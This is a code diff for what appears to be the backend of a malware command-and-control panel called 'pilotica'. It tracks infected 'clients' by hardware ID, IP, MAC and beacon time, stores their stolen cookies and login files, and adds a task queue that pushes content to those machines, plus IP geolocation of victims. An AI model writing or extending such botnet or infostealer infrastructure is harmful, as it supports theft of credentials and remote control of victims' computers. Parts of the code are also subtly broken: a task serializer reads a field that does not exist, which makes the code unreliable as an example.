@@ -2,16 +2,19 @@ import random
 from datetime import datetime, timedelta
 from secrets import token_urlsafe
 from uuid import uuid4 as rand_uuid
+import json
+import requests
 
 from bcrypt import checkpw, gensalt, hashpw
-from sqlalchemy import (Boolean, Column, Integer, LargeBinary, String, Text,
-                        create_engine)
+from sqlalchemy import Boolean, Column, Integer, LargeBinary, String, Text, create_engine, ForeignKey
 from sqlalchemy.exc import OperationalError
-from sqlalchemy.orm import declarative_base, sessionmaker
+from sqlalchemy.orm import declarative_base, sessionmaker, relationship
 
 from .identicon import generate_identicon
 from .misc import generate_hwid
 from .premissions import Premission, Premissions
+
+from sanic.log import logger
 
 Base = declarative_base()
 
@@ -92,6 +95,7 @@ class Client(Base):
     hwid = Column(String(40), nullable=False, unique=True)
     time = Column(String(20), nullable=False)
     ip = Column(String(20), nullable=False)
+    geoloc = Column(String(100), nullable=True)
     mac = Column(String(20), nullable=False)
     hostname = Column(String(20), nullable=False)
     cpu = Column(String(100), nullable=False)
@@ -103,17 +107,22 @@ class Client(Base):
 
     def to_json(self) -> dict:
         """Convert the client object to a JSON-serializable dictionary."""
+        with SessionLocal() as session:
+            task_count = len(session.query(Task).filter(Task.client_id == self.id).all())
+            geoloc = self.geoloc
         return {
             "id": self.id,
             "hwid": self.hwid,
             "time": self.time,
             "hostname": self.hostname,
             "ip": self.ip,
+            "geoloc": json.loads(self.geoloc) if self.geoloc else None,
             "cpu": self.cpu,
             "mac": self.mac,
             "checked": self.checked,
             "online": self.is_online(),
-            "software": self.software
+            "software": self.software,
+            "task_count": task_count
         }
 
     def is_online(self) -> bool:
@@ -121,13 +130,14 @@ class Client(Base):
         last_beacon_time = datetime.strptime(self.last_beacon, "%d-%m-%Y %H:%M:%S")
         return datetime.now() - last_beacon_time < timedelta(minutes=5)
 
-def create_client(ip, mac, hostname, cpu, software, cookies_file, logins_file):
+def create_client(ip, geoloc: dict, mac, hostname, cpu, software, cookies_file, logins_file):
     hwid = generate_hwid(mac, hostname, cpu)
     time = datetime.now().strftime("%d-%m-%Y %H:%M:%S")
     client = Client(
         hwid=hwid,
         time=time,
         ip=ip,
+        geoloc=json.dumps(geoloc),
         mac=mac,
         hostname=hostname,
         cpu=cpu,
@@ -168,6 +178,36 @@ def get_total_clients_count_last_24_hours() -> list:
 
     return list(reversed(totals))
 
+class Task(Base):
+    __tablename__ = 'tasks'
+
+    id = Column(Integer, primary_key=True, autoincrement=True)
+    creation = Column(String(20), nullable=False)
+    type = Column(String(10), nullable=False)
+    content = Column(LargeBinary, nullable=False)
+    name = Column(String(10), nullable=False)
+
+    client_id = Column(Integer, ForeignKey('clients.id'), nullable=False)
+    client = relationship("Client", backref="tasks")
+
+    def to_json(self) -> dict:
+        return {
+            "id": self.id,
+            "created_at": self.created_at,
+            "type": self.type,
+            "client_id": self.client_id
+        }
+
+def create_task(client: Client, task_name: str, task_type: str, content: bytes) -> Task:
+    task = Task(
+        creation = datetime.now().strftime("%d-%m-%Y %H:%M:%S"),
+        type=task_type,
+        content=content,
+        client=client,
+        name = task_name,
+    )
+    return task
+
 
 # Database setup
 DATABASE_URL = "sqlite:///./pilotica.db"  # or any other DB URL
@@ -193,15 +233,33 @@ def init_db():
             db.add(default_user)
             db.commit()
 
+        logger.info("Default Login: admin, admin01!")
+
         # Generate 100 random clients in the last 24 hours
         if not db.query(Client).first():
+
+            def get_geoloc(ip):
+                url = f"http://ip-api.com/json/{ip}?fields=status,country,city,lat,lon"
+                r = requests.get(url, timeout=5)
+                
+                if r.status_code != 200:
+                    return None
+                
+                j = r.json()
+                if j.get("status") == "fail":
+                    return None
+                
+                return j
+
             now = datetime.now()
             for _ in range(100):
                 time_offset = random.randint(0, 24 * 60 * 60)  # Random offset in seconds within the last 24 hours
                 client_time = (now - timedelta(seconds=time_offset)).strftime("%d-%m-%Y %H:%M:%S")
                 last_beacon = client_time if random.random() > 0.5 else now.strftime("%d-%m-%Y %H:%M:%S")
+                ip = ips.pop()
                 random_client = create_client(
-                    ip=ips.pop(),
+                    ip=ip,
+                    geoloc=get_geoloc(ip),
                     mac=f"00:1B:44:{random.randint(0, 255):02X}:{random.randint(0, 255):02X}:{random.randint(0, 255):02X}",
                     hostname=f"client-{random.randint(1000, 9999)}",
                     cpu=f"Intel Core i{random.randint(3, 9)}-{random.randint(1000, 9999)}",
